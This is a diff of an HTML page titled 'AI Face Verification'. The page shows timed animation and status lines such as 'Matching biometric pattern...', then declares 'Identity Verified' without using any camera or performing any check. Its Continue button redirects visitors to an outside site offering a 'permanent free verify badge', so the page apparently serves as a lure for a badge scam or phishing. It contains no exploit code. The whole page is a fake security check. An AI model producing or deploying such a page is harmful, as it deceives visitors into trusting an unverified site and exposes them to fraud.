@@ -1,116 +1,126 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Face Verification</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI Face Verification</title>
 
 <style>
-  body {
-    margin: 0;
-    height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-family: 'Segoe UI', sans-serif;
-    background: linear-gradient(135deg, #667eea, #764ba2);
-  }
+body {
+  margin: 0;
+  height: 100vh;
+  background: radial-gradient(circle at center, #0f2027, #203a43, #2c5364);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  font-family: 'Segoe UI', sans-serif;
+  color: #fff;
+}
 
-  .container {
-    backdrop-filter: blur(20px);
-    background: rgba(255, 255, 255, 0.1);
-    padding: 40px;
-    border-radius: 20px;
-    text-align: center;
-    width: 90%;
-    max-width: 380px;
-    color: white;
-    box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-  }
+/* Glass container */
+.container {
+  width: 360px;
+  padding: 30px;
+  border-radius: 20px;
+  backdrop-filter: blur(25px);
+  background: rgba(255,255,255,0.05);
+  box-shadow: 0 0 40px rgba(0,255,255,0.2);
+  text-align: center;
+}
 
-  .scanner-ring {
-    width: 180px;
-    height: 180px;
-    border-radius: 50%;
-    margin: auto;
-    background: conic-gradient(#00ffcc, #00aaff, #ff00cc, #00ffcc);
-    animation: spin 2s linear infinite;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    position: relative;
-  }
+/* Scanner */
+.scanner {
+  position: relative;
+  width: 200px;
+  height: 200px;
+  margin: auto;
+  border-radius: 50%;
+  border: 2px solid rgba(0,255,255,0.3);
+  overflow: hidden;
+}
 
-  .scanner-ring::before {
-    content: "";
-    position: absolute;
-    width: 140px;
-    height: 140px;
-    background: rgba(0,0,0,0.6);
-    border-radius: 50%;
-  }
+/* Animated scan line */
+.scan-line {
+  position: absolute;
+  width: 100%;
+  height: 4px;
+  background: linear-gradient(to right, transparent, #00ffff, transparent);
+  top: 0;
+  animation: scan 2s infinite;
+}
 
-  .scanner-core {
-    position: relative;
-    font-size: 50px;
-    z-index: 2;
-  }
+@keyframes scan {
+  0% { top: 0; }
+  100% { top: 100%; }
+}
 
-  .pulse {
-    animation: pulse 1.5s infinite;
-  }
+/* Glow ring */
+.ring {
+  position: absolute;
+  inset: 0;
+  border-radius: 50%;
+  box-shadow: 0 0 25px #00ffff inset, 0 0 25px #00ffff;
+  animation: pulse 2s infinite;
+}
 
-  @keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-  }
+@keyframes pulse {
+  0% { opacity: .6; }
+  50% { opacity: 1; }
+  100% { opacity: .6; }
+}
 
-  @keyframes pulse {
-    0% { transform: scale(1); opacity: 1; }
-    50% { transform: scale(1.1); opacity: 0.7; }
-    100% { transform: scale(1); opacity: 1; }
-  }
+/* Face icon */
+.face {
+  font-size: 60px;
+  margin-top: 60px;
+  z-index: 2;
+  position: relative;
+}
 
-  .status {
-    margin-top: 20px;
-    font-size: 18px;
-  }
+/* Status text */
+.status {
+  margin-top: 20px;
+  font-size: 18px;
+  letter-spacing: 1px;
+}
 
-  .progress {
-    margin-top: 10px;
-    font-size: 22px;
-    font-weight: bold;
-  }
+/* Steps */
+.steps {
+  margin-top: 15px;
+  font-size: 14px;
+  opacity: 0.8;
+}
 
-  .verified {
-    display: none;
-    font-size: 22px;
-    color: #00ffcc;
-    margin-top: 20px;
-    animation: fadeIn 1s ease forwards;
-  }
+.verified {
+  display: none;
+  font-size: 22px;
+  color: #00ffcc;
+  margin-top: 20px;
+  animation: fade 1s ease forwards;
+}
 
-  @keyframes fadeIn {
-    from {opacity: 0; transform: translateY(10px);}
-    to {opacity: 1; transform: translateY(0);}
-  }
+@keyframes fade {
+  from {opacity:0; transform: translateY(10px);}
+  to {opacity:1; transform: translateY(0);}
+}
 
-  button {
-    display: none;
-    margin-top: 25px;
-    padding: 12px 25px;
-    border: none;
-    border-radius: 8px;
-    background: #00c6ff;
-    color: white;
-    font-size: 16px;
-    cursor: pointer;
-    transition: 0.3s;
-  }
+/* Button */
+button {
+  display: none;
+  margin-top: 25px;
+  padding: 12px 25px;
+  border: none;
+  border-radius: 8px;
+  background: linear-gradient(45deg, #00ffff, #00ffcc);
+  color: #000;
+  font-weight: bold;
+  cursor: pointer;
+  transition: 0.3s;
+}
 
-  button:hover {
-    background: #0094cc;
-  }
+button:hover {
+  transform: scale(1.05);
+}
 
 </style>
 </head>
@@ -118,52 +128,62 @@
 <body>
 
 <div class="container">
-  <div class="scanner-ring" id="ring">
-    <div class="scanner-core pulse" id="core">🔍</div>
+
+  <div class="scanner">
+    <div class="ring"></div>
+    <div class="scan-line"></div>
+    <div class="face" id="faceIcon">🙂</div>
   </div>
 
-  <div class="status" id="statusText">Scanning your face...</div>
-  <div class="progress" id="progressText">0%</div>
+  <div class="status" id="status">Initializing AI Scan...</div>
+  <div class="steps" id="steps">Please hold still</div>
 
-  <div class="verified" id="verifiedText">✅ Verified — You’re Human</div>
+  <div class="verified" id="verified">✅ Identity Verified</div>
   <button id="btn">Continue</button>
+
 </div>
 
 <audio id="sound" src="https://assets.mixkit.co/sfx/preview/mixkit-confirmation-tone-2867.mp3"></audio>
 
 <script>
-  let progress = 0;
-  const progressText = document.getElementById("progressText");
 
-  const interval = setInterval(() => {
-    progress += Math.floor(Math.random() * 10);
+const steps = [
+  "Detecting face structure...",
+  "Analyzing depth & contours...",
+  "Matching biometric pattern...",
+  "Finalizing verification..."
+];
 
-    if (progress >= 100) {
-      progress = 100;
-      clearInterval(interval);
-      completeScan();
-    }
+let i = 0;
 
-    progressText.innerText = progress + "%";
-  }, 300);
-
-  function completeScan() {
-    document.getElementById("sound").play();
-
-    document.getElementById("statusText").style.display = "none";
-    document.getElementById("progressText").style.display = "none";
-
-    const core = document.getElementById("core");
-    core.classList.remove("pulse");
-    core.innerText = "✔";
-
-    document.getElementById("verifiedText").style.display = "block";
-    document.getElementById("btn").style.display = "inline-block";
+function nextStep() {
+  if (i < steps.length) {
+    document.getElementById("steps").innerText = steps[i];
+    i++;
+    setTimeout(nextStep, 1200);
+  } else {
+    finish();
   }
+}
 
-  document.getElementById("btn").onclick = () => {
-    window.location.href = "https://permanent-free-verify-badge.surge.sh/";
-  };
+function finish() {
+  document.getElementById("sound").play();
+
+  document.getElementById("status").style.display = "none";
+  document.getElementById("steps").style.display = "none";
+
+  document.getElementById("faceIcon").innerText = "✔";
+
+  document.getElementById("verified").style.display = "block";
+  document.getElementById("btn").style.display = "inline-block";
+}
+
+setTimeout(nextStep, 1500);
+
+document.getElementById("btn").onclick = () => {
+  window.location.href = "https://permanent-free-verify-badge.surge.sh/";
+};
+
 </script>
 
 </body>
